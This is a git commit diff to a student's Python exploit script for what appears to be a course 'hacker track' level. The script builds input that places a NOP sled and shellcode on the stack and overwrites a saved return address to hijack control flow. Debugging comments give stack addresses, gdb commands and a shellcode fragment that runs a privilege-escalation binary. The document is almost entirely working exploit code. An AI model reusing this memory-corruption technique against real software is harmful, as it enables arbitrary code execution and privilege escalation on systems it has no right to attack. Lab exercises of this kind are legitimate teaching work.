fa230ca56e85075602891676723383ad5531bd2a
Marlon Fendler <marlon.fendler24@gmail.com>
2026-04-01 20:53:02 +0200

    commit to fix git stuff

--- assignment_2/Hacker_track/level10.py
+++ assignment_2/Hacker_track/level10.py
@@ -15,17 +15,65 @@ if len(sys.argv) != 3:
 
 # Whole thing --> "allocate 1 3\nsetstring 1 {shellcode}\nallocate 2 3\nsetint 2 0x7fffffffe168\nsetstring 2 0x555555558044\nprint 2"
 
-return_address = sys.argv[1].encode()
-slot_1_address = sys.argv[2].encode()
+return_address_address = int(sys.argv[1], 16)
+shellcode_address = int(sys.argv[2], 16) # this should be some address on the stack that has space for the 56 bytes
+
+nop_sled = b"\x90" * (60) 
+
+raw_shellcode = nop_sled + raw_shellcode
+# inject the address of the return address as location of the first slot to then overwrite the return address with setstring
+allocate_0 = b"allocate 0 3\n"
+fix_0_location_size_to_shellcode_length = b"setstring 0 " + raw_shellcode + b"\n" # CAUTION: if you add a nop-sled, make this longer
+inject_shellcode_address = b"setint 0 " + f"{str(shellcode_address)}".encode() + b"\n" # next setstring will write to that address
+inject_shellcode_onto_stack = b"setstring 0 " + raw_shellcode + b"\n" # write shellcode onto stack address (stack is executable)
+
+
+string_injectable_shellcode_address = shellcode_address.to_bytes(8, byteorder='little') # convert the shellcode address to bytes to inject as string
+print(f"injecting: ", string_injectable_shellcode_address.hex(  ))
+# string_injectable_shellcode_address.rstrip(b"\x00")
+# print(f"length: ", len(string_injectable_shellcode_address))
+# string_injectable_shellcode_address += (8 - len(string_injectable_shellcode_address)) * b"A"
+
 
 allocate_1 = b"allocate 1 3\n"
-setstring_1 = b"setstring 1 " + raw_shellcode + b"\n"
-allocate_2 = b"allocate 2 3\n"
-print_1 = b"print 1\n"
-setint_2 = b"setint 2 " + f"{int.from_bytes(return_address, byteorder='little')}".encode() + b"\n"
-DEBUG_PRINTS = b"print 1\nprint 2\n"
-setstring_2 = b"setstring 2 " + struct.pack('<Q', int(slot_1_address, 16)) + b"\n"
-print_2 = b"print 2\n"
+fix_1_location_size_to_shellcode_address_length = b"setstring 1 " + string_injectable_shellcode_address + b"\n"
+inject_return_address_address = b"setint 1 " + f"{str(return_address_address)}".encode() + b"\n" # next setstring will  overwrite the return address
+overwrite_return_address = b"setstring 1 " + string_injectable_shellcode_address + b"\n" # write the address of the shellcode onto the return address so that when the function returns, it jumps to our shellcode
 
-output = allocate_1 + setstring_1 + allocate_2 + print_1 + setint_2 + DEBUG_PRINTS + setstring_2 + print_2
+output =  allocate_0 + fix_0_location_size_to_shellcode_length + inject_shellcode_address + inject_shellcode_onto_stack + allocate_1 + fix_1_location_size_to_shellcode_address_length + inject_return_address_address + overwrite_return_address
+
 sys.stdout.buffer.write(output)
+
+
+# rbp: 0x7fffffffe250 or 0x7fffffffe1a0
+# return address's address: 0x7fffffffe258 or 0x7fffffffe1a8
+
+# rbp in set_string: 0x7fffffffe1d0 (actually with precise gdb debuggin: 0x7fffffffe1a0 )
+# return address in set_string: 0x7fffffffe1d8 ("" 0x7fffffffe1a8)
+
+# rbp in handle_setstring: 0x7fffffffe1d0
+# return address in handle_setstring: 0x7fffffffe1d8
+
+# random instruction address in handle_setstring: 0x0000555555555613
+# random instruction in set_string: 0x00005555555552fe
+
+# array start: 0x0000555555558040
+# shellcode address (its the + 4 bytes from  of array start): 0x0000555555558044 (+ 4 bytes as the first 4 bytes are the type of slot 1)
+
+# stack start_address: 0x7ffffffde000 
+
+# r <<< $(python3 ~/level10.py 0x7fffffffe258 0x0000555555558044)
+# r <<< $(python3 ~/level10.py 0x7fffffffe1d8 0x0000555555558044)
+# r <<< $(python3 ~/level10.py 0x7fffffffe1a8 0x7ffffffde008)
+
+# some instruction address in set_string: 0x0000555555555347
+
+# allocate 0 3 
+# setstring 0 H�ĀH1�RH�escalateSH�al/bin//SH�/usr/locSH��RWH��H1��;
+# allocate 1 3
+# setstring 1 AAAAAAAA
+# setint 1 140737488347560
+
+# setstring 1 @UUUAAAA
+
+# python3 ~/level10.py 0x7fffffffe1a8 0x7ffffffde008 | /levels/level10/level10
